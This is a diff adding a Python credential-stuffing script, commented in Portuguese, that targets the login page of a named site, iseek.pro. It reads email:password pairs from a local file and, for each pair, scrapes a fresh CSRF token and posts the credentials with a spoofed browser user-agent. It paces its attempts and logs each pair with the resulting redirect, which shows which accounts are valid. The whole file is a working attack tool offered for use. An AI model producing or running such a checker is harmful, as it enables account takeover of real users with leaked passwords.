@@ -1,0 +1,119 @@
+import requests
+from bs4 import BeautifulSoup
+import re
+from urllib.parse import urljoin
+import time
+
+LOGIN_PAGE = "https://iseek.pro/login"  
+TIMEOUT = 15
+DB_FILE = "db.txt"  
+SLEEP_BETWEEN = 2  
+
+def get_token_and_session(url=LOGIN_PAGE, timeout=TIMEOUT):
+    sess = requests.Session()
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
+    }
+    try:
+        r = sess.get(url, headers=headers, timeout=timeout)
+    except Exception as e:
+        
+        try:
+            sess.close()
+        except Exception:
+            pass
+        return None, None, f"GET_ERROR:{e}"
+
+    
+    try:
+        soup = BeautifulSoup(r.text, "html.parser")
+        tok_input = soup.find("input", attrs={"name": "_token"})
+        if tok_input and tok_input.has_attr("value"):
+            return tok_input["value"], sess, None
+    except Exception:
+        pass
+
+    
+    m = re.search(r'name=["\']_token["\']\s+value=["\']([^"\']+)["\']', r.text)
+    if m:
+        return m.group(1), sess, None
+
+    
+    try:
+        sess.close()
+    except Exception:
+        pass
+    return None, None, "NO_TOKEN_FOUND"
+
+def try_login(login, senha):
+    token, sess, err = get_token_and_session()
+    if err is not None:
+        return f"{login}:{senha} = {err}"
+
+    if not token or sess is None:
+        return f"{login}:{senha} = NO_TOKEN_FOUND"
+
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Referer": LOGIN_PAGE,
+    }
+    sess.headers.update(headers)
+
+    payload = {
+        "_token": token,
+        "email": login,
+        "password": senha,
+    }
+
+    try:
+        
+        r = sess.post(LOGIN_PAGE, data=payload, allow_redirects=False, timeout=TIMEOUT)
+        if r.is_redirect or r.status_code in (301, 302, 303, 307, 308):
+            loc = r.headers.get("Location")
+            if loc:
+                if loc.startswith("/"):
+                    loc = urljoin(LOGIN_PAGE, loc)
+                return f"{login}:{senha} = {loc}"
+            else:
+                return f"{login}:{senha} = REDIRECT_NO_LOCATION(status={r.status_code})"
+
+        
+        r2 = sess.post(LOGIN_PAGE, data=payload, allow_redirects=True, timeout=TIMEOUT)
+        return f"{login}:{senha} = {r2.url}"
+    except Exception as e:
+        return f"{login}:{senha} = POST_ERROR:{e}"
+    finally:
+        
+        try:
+            sess.close()
+        except Exception:
+            pass
+
+def main():
+    try:
+        with open(DB_FILE, "r", encoding="utf-8") as f:
+            lines = [ln.strip() for ln in f if ln.strip()]
+    except FileNotFoundError:
+        print(f"Arquivo {DB_FILE} nÃ£o encontrado.")
+        return
+
+    total = len(lines)
+    for idx, line in enumerate(lines, 1):
+        if ":" not in line:
+            print(f"{line} = INVALID_FORMAT")
+        else:
+            login, senha = line.split(":", 1)
+            login = login.strip()
+            senha = senha.strip()
+            out = try_login(login, senha)
+            print(out)
+
+        
+        if idx != total:
+            time.sleep(SLEEP_BETWEEN)
+
+if __name__ == "__main__":
+    main()
